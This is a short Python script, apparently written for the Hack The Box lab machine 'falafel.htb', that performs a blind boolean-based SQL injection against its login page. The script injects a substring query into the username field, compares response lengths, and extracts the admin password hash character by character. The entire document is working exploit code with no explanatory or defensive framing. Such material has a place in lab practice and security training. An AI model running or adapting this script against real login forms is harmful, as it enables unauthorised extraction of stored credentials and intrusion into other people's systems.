import requests


url = 'http://falafel.htb/login.php'
symbols = '0123456789abcdef'
password_field = "admin' and substring((select password from users where username='admin'),{},1)='{}'#"


def get_request_len(pos, char):
    post = {
        'username': password_field.format(pos,char),
        'password': "aaa",
    }
    request = requests.post(url, data=post)
    print('.', end='', flush=True)
    return len(request.text)


bad_len = get_request_len(0, 'x')
password = ''
for pos in range(1, 100):
    founded = False
    for symbol in symbols:
        if get_request_len(pos, symbol) != bad_len:
            password += symbol
            founded = True
            print(symbol, end='', flush=True)
            break
    if not founded:
        break
print(password)

